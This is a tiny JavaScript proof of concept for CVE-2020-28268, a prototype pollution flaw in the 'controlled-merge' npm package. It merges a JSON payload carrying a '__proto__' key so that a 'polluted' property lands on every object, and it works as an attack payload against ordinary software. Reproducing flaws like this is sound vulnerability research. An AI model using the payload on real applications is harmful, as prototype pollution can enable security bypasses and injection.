//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28268
const merge = require("controlled-merge");

const obj = merge(
  {},
  JSON.parse('{ "__proto__": { "polluted": "yes" } }'),
  true
);
